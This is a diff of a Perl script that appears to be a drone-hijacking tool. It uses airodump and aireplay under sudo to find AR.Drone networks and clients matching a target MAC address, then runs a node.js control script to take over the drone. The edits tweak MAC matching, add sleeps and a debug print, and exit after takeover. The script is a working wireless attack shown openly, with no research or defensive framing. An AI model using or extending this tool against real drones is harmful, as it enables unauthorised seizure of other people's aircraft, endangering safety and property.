@@ -23,6 +23,8 @@ my $droneToHack = shift || die "NO MAC PROVIDED $!";
 my $interface  = shift || "wlan1";
 my $interface2 = shift || "wlan0";
 
+chomp $droneToHack;
+
 # the JS to control our drone
 my $controljs  = shift || "drone_control/drone_pwn.js";
 
@@ -63,7 +65,7 @@ while (1)
 			local $SIG{INT} = sub { die };
 			my $pid = open(DUMP, "|sudo $airodump --output-format csv -w $tmpfile $interface >>/dev/null 2>>/dev/null") || die "Can't run airodump ($airodump): $!";
 			print "pid $pid\n";
-
+			sleep(10);
 			# wait 5 seconds then kill
 			sleep 2;
 			print DUMP "\cC";
@@ -75,6 +77,7 @@ while (1)
 			sudo("kill", "-9", $pid);
 			sleep 1;
 			sudo("killall", "-9", $aireplay, $airodump);
+
 			close(DUMP);
 		};
 
@@ -84,6 +87,7 @@ while (1)
 		my %chans;
 		foreach my $tmpfile1 (glob("$tmpfile*.csv"))
 		{
+
 				open(APS, "<$tmpfile1") || print "Can't read tmp file $tmpfile1: $!";
 				while (<APS>)
 				{
@@ -91,15 +95,15 @@ while (1)
 					s/[\0\r]//g;
 
 					foreach my $dev (@drone_macs)
-					{
+					{	
+						print $dev;
 						# determine the channel
 						if (/^($dev:[\w:]+),\s+\S+\s+\S+\s+\S+\s+\S+\s+(\d+),.*(ardrone\S+),/)
 						{
 							my $v1 = $1;
 							my $v2 = $2;
-							my $v3 = $3;
-
-							if($v1=~/$droneToHack/){
+							my $v3 = $3;	
+							if($v1=~/$droneToHack/i){
 								print "CHANNEL $v1 $v2 $v3\n";
 								$chans{$v1} = [$v2, $v3];
 							}
@@ -110,7 +114,7 @@ while (1)
 						{
 							my $v1 = $1;
 							my $v2 = $2;
-							if($v2=~/$droneToHack/){
+							if($v2=~/$droneToHack/i){
 								print "CLIENT $v1 $v2\n";
 								$clients{$v1} = $v2;
 							}
@@ -119,6 +123,7 @@ while (1)
 				}
 				close(APS);
 				sudo("rm", $tmpfile1);
+				
 		}
 		print "\n\n";
 
@@ -159,6 +164,8 @@ while (1)
 			print "\n\nTAKING OVER DRONE\n";
 			sudo($nodejs, $controljs);
 
+			sleep(15);
+			exit 0;
 		}
 
 	sleep 5;
